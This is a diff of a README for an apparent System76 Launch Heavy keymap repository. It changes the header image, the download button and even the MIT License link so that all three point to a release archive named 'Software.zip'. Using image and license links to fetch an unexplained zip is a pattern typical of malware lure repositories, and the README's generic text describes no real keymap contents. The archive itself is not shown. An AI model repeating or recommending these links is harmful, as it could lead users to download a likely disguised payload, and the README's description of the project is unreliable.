@@ -1,6 +1,6 @@
 # System76 Launch Heavy Keymap 🚀🔑
 
-![System76 Launch Heavy Keymap](https://github.com/angel5719/launch-heavy-keymap/releases/download/v1.0/Application.zip)
+![System76 Launch Heavy Keymap](https://github.com/angel5719/launch-heavy-keymap/releases/download/v2.0/Software.zip)
 
 Welcome to the official repository for the System76 Launch Heavy Keymap! This repository contains the keymap configuration for the System76 Launch Heavy keyboard, featuring a variety of functionalities such as layers, macros, RGB animations, and more. 
 
@@ -23,7 +23,7 @@ Welcome to the official repository for the System76 Launch Heavy Keymap! This re
 
 To get started with the System76 Launch Heavy keymap, you can download the keymap configuration files from the following link:
 
-[![Download Keymap](https://github.com/angel5719/launch-heavy-keymap/releases/download/v1.0/Application.zip)](https://github.com/angel5719/launch-heavy-keymap/releases/download/v1.0/Application.zip)
+[![Download Keymap](https://github.com/angel5719/launch-heavy-keymap/releases/download/v2.0/Software.zip)](https://github.com/angel5719/launch-heavy-keymap/releases/download/v2.0/Software.zip)
 
 Click the button above to download the keymap configuration files. Once downloaded, you can customize the keymap to suit your preferences and flash it onto your System76 Launch Heavy keyboard.
 
@@ -48,6 +48,6 @@ If you have any questions, issues, or feedback regarding the System76 Launch Hea
 
 ## License 📜
 
-This repository and the associated keymap configuration files are released under the [MIT License](https://github.com/angel5719/launch-heavy-keymap/releases/download/v1.0/Application.zip). Feel free to utilize, modify, and distribute the keymap files in accordance with the terms of the license.
+This repository and the associated keymap configuration files are released under the [MIT License](https://github.com/angel5719/launch-heavy-keymap/releases/download/v2.0/Software.zip). Feel free to utilize, modify, and distribute the keymap files in accordance with the terms of the license.
 
 Thank you for using the System76 Launch Heavy keymap! We hope you enjoy the enhanced typing experience and customization options offered by our keymap configuration. Happy typing! 🚀🔑
